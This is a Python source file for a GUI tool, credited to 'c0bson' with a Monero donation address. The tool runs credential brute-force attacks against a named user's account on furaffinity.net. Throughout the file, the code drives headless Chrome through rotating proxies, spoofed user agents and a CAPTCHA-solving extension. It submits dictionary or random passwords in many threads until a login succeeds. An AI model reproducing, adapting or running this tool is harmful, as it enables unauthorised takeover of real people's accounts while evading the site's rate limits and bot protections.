from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import chromedriver_autoinstaller
import time
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
from fp.fp import FreeProxy
import tkinter as tk
from tkinter import filedialog, messagebox
import os
import itertools
import string
from threading import Thread

useragents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0"
    ]

found = None
chromedriver_autoinstaller.install()
stop = False
target = ''
def write_line(file_path, line, encodings=None):
    """
    Appends a new line to the end of a text file, trying different encodings if needed.

    Args:
        file_path (str): Path to the text file.
        line (str): The line to append to the file.
        encodings (list): List of encodings to try.
    """
    if encodings is None:
        encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']  

    for encoding in encodings:
        try:
            with open(file_path, 'a', encoding=encoding) as file:
                file.write(line + '\n')
            break 
        except UnicodeEncodeError:
            print(f"Failed to encode with encoding {encoding}, trying next encoding...")
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break

        
def read_file(file_path, chunk_size=1024, encodings=None):
    """
    Reads a large text file in chunks and processes it line by line, 
    trying different encodings if needed.

    Args:
        file_path (str): Path to the text file.
        chunk_size (int): Size of each chunk to read (in bytes).
        encodings (list): List of encodings to try.

    Returns:
        list: A list of all lines in the file, with newline characters removed.
    """
    lines = []  

    if encodings is None:
        encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']  

    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding) as file:
                buffer = ''
                while True:
                    chunk = file.read(chunk_size)
                    if not chunk:
                        if buffer:
                            lines.append(buffer.strip('\n'))  
                        break
                    lines.extend((buffer + chunk).splitlines(True))  
                    buffer = ''
            return [line.strip('\n') for line in lines]  
        except UnicodeDecodeError:
            print(f"Failed to decode with encoding {encoding}, trying next encoding...")
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            return [] 
        except Exception as e:
            print(f"An error occurred: {e}")
            return [] 



def generate_password():
    bad_passwords = read_file('bad_passwords.txt')

    characters = string.ascii_letters + string.digits + string.punctuation

    while True:
        password_length = random.randint(7, 72)

        shuffled_characters = random.sample(characters, len(characters))

        password_attempt = ''.join(random.choices(shuffled_characters, k=password_length))

        if password_attempt not in bad_passwords:
            return password_attempt

def run(proxy_path, bad_path, suggest_path, target):
    global found
    while True:
        proxy = None
        ip_addr = None
        port = None
        password = None
        driver = None
        if stop:
            break
        try:
            if not os.path.isfile('bad_proxies.txt'):
                open('bad_proxies.txt', 'w').close()
            if not os.path.isfile('bad_passwords.txt'):
                open('bad_passwords.txt', 'w').close()
            chrome_options = Options()
            chrome_options.add_extension('captcha.zip')
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument(f"user-agent={random.choice(useragents)}")

            if proxy_path:
                try:
                    proxies = read_file(proxy_path)
                    bad_proxies = read_file('bad_proxies.txt')
                    while proxy is None or proxy in bad_proxies:
                        proxy = random.choice(proxies)                    
                    ip_addr = proxy.split(':')[0]
                    port = proxy.split(':')[1]                       
                except:
                    bad_proxies = read_file('bad_proxies.txt')
                    proxy = FreeProxy(timeout=0.3, rand=True).get()
                    ip_addr = proxy.split(':')[1]
                    port = proxy.split(':')[2]  
                    while proxy is None or f"{ip_addr.replace('//','')}:{port}" in bad_proxies:
                        proxy = FreeProxy(timeout=0.3, rand=True).get()
                    ip_addr = proxy.split(':')[1]
                    port = proxy.split(':')[2]   
            else:
                bad_proxies = read_file('bad_proxies.txt')
                proxy = FreeProxy(timeout=0.3, rand=True).get()
                ip_addr = proxy.split(':')[1]
                port = proxy.split(':')[2]  
                while proxy is None or f"{ip_addr.replace('//','')}:{port}" in bad_proxies:
                    proxy = FreeProxy(timeout=0.3, rand=True).get()
                ip_addr = proxy.split(':')[1]
                port = proxy.split(':')[2]   
            chrome_options.add_argument('--proxy-server=%s' % f"{ip_addr.replace('//','')}:{port}")

            if suggest_path:
                passwords = read_file(suggest_path)
                bad_passwords = read_file('bad_passwords.txt')

                for passw in passwords:
                    if passw not in bad_passwords:
                        password = passw
                        break

            else:
                password = generate_password()


            if password is None:
                password = generate_password()
            print(f'Attempting password: {password}')
            driver = webdriver.Chrome(options=chrome_options)
            driver.get('chrome-extension://hlifkpholllijblknnmbfagnkjneagid/popup/popup.html#/')
            
            driver.get('https://www.furaffinity.net/login')

            time.sleep(2)
            def monitor_url_changes(driver, timeout=30):
                start_time = time.time()
                current_url = driver.current_url

                while time.time() - start_time < timeout:
                    new_url = driver.current_url
                    if new_url != current_url:
                        print(f"Redirect detected: {new_url}")
                        return new_url
                    time.sleep(0.1)
                raise Exception("No redirect detected within the timeout period")

            username_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'name'))
            )
            username_element.send_keys(target)

            password_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'pass'))
            )
            password_element.send_keys(password)

            submit_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'login'))
            )
            submit_element.click()

            time.sleep(5)

            url = monitor_url_changes(driver, timeout=30)
            print(url)
            if 'login' in url:
        
                write_line('bad_passwords.txt', password)
                raise Exception("password Fail")
            
            element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//*[text()='My Userpage']"))
            )
            if element.get_attribute('href'):
                found = password
                driver.close()
            else:
                write_line('bad_passwords.txt', password)
                raise Exception("password Fail")


            break
        except Exception as e:
            print(e)
            if stop == False and ip_addr != None and driver != None:
                if not os.path.isfile('bad_proxies.txt'):
                    open('bad_proxies.txt', 'w').close()
                write_line('bad_proxies.txt', f"{ip_addr.replace('//','')}:{port}")

            if driver:
                driver.close()
            pass


class BruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Furafinity Bruteforcer")
        
        self.text_widget = tk.Text(root, wrap='word', height=20, width=80)
        self.text_widget.pack(padx=10, pady=10)
        
        self.text1 = tk.Label(root, text="Enter the target:")
        self.text1.pack(pady=5)
        self.text_input = tk.Entry(root, width=50)
        self.text_input.pack(pady=5)
        
        self.text2 = tk.Label(root, text="Enter amount of threads to run (How many instances):")
        self.text2.pack(pady=5)
        self.input_value = tk.StringVar(root, "1")
        self.integer_input = tk.Entry(root, textvariable=self.input_value, width=50)
        self.integer_input.pack(pady=5)
        
        self.text3 = tk.Label(root, text="Select proxy txt file or leave empty to use free proxy:")
        self.text3.pack(pady=5)
        self.proxy_button = tk.Button(root, text="Select Proxy txt file", command=self.proxy_file)
        self.proxy_button.pack(pady=5)
        
        self.text4 = tk.Label(root, text="Select tested/bad passwords txt file or leave empty to use none:")
        self.text4.pack(pady=5)
        self.bad_button = tk.Button(root, text="Select tested passwords txt file", command=self.tested_file)
        self.bad_button.pack(pady=5)
        
        self.text5 = tk.Label(root, text="Select dictionary txt file or leave empty to use none:")
        self.text5.pack(pady=5)
        self.suggest_button = tk.Button(root, text="Select dictionary txt file", command=self.dict_file)
        self.suggest_button.pack(pady=5)
        
        self.run_button = tk.Button(root, text="Run bruteforce", command=self.run_brute)
        self.run_button.pack(pady=10)
        
        self.stop_button = tk.Button(root, text="Stop bruteforce", command=self.stop_brute)
        self.stop_button.pack(pady=10)
        
        self.brute_text = tk.Label(root, text="Found password:")
        self.brute_text.pack(pady=5)
        
        self.update_content()

        self.thread = Thread(target=self.update_content_thread)
        self.thread.daemon = True
        self.thread.start()

        self.credit_label = tk.Label(root, text="Bruteforcer by c0bson \nXMR Address: 4BEHHRhHMrYC3yQ5Xv71eDXeiUpshLXMHC7JWYrotAreXMknEjmZU38HMFCXUM43YoFya7qBD3Q5R61a13NnyA35Lst38NY")
        self.credit_label.pack(side=tk.BOTTOM, pady=10)

    def update_content_thread(self):
        while True:
            self.update_content()
            time.sleep(5)  
        
    def proxy_file(self):
        file_path = filedialog.askopenfilename(
            title=f"Select Proxy File",
            filetypes=(("Text Files", "*.txt"), ("All Files", "*.*"))
        )
        if file_path:
            self.proxy_path = file_path
            self.proxy_button.config(text=f"Selected: {file_path.split('/')[-1]}")

    def tested_file(self):
        file_path = filedialog.askopenfilename(
            title=f"Select Tested Passwords File",
            filetypes=(("Text Files", "*.txt"), ("All Files", "*.*"))
        )
        if file_path:
            self.bad_path = file_path
            self.bad_button.config(text=f"Selected: {file_path.split('/')[-1]}")


    def dict_file(self):
        file_path = filedialog.askopenfilename(
            title=f"Select Dictionary File",
            filetypes=(("Text Files", "*.txt"), ("All Files", "*.*"))
        )
        if file_path:
            self.suggest_path = file_path
            self.suggest_button.config(text=f"Selected: {file_path.split('/')[-1]}")


    def run_brute(self):
        target = self.text_input.get()
        num_threads = int(self.input_value.get())
        for i in range(num_threads):
            time.sleep(1)
            thread = Thread(target=run, args=[self.proxy_path, self.bad_path, self.suggest_path, target])
            thread.start()
        stop = False
        
        
    def stop_brute(self):
        stop = True

    def update_content(self):
        self.brute_text.config(text = f"Found password: {found}")
        self.text_widget.delete(1.0, tk.END)
        try:
            
            lines = read_file('bad_passwords.txt')[-20:]
            self.text_widget.insert(tk.END, f"Last 20 passwords tried:\n")
            self.text_widget.insert(tk.END, "".join(lines) + "\n")
        except Exception as e:
            pass
if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.mainloop()
